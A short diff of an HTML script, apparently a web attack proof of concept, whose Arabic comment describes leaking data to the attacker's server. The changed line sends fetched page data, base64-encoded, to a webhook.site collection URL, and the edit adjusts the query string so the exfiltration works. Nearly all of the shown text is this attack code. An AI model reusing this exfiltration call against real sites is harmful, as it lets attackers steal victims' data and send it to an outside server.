@@ -26,7 +26,7 @@
       document.body.innerHTML += "<pre>" + data + "</pre>";
 
       // أو تسريب الداتا لسيرفر المهاجم
-      fetch("https://webhook.site/e018a665-94af-49eb-b82f-68da45203f50" + btoa(data));
+      fetch("https://webhook.site/e018a665-94af-49eb-b82f-68da45203f50?data=" + btoa(data));
     })
     .catch(err => console.error("Error:", err));
   </script>
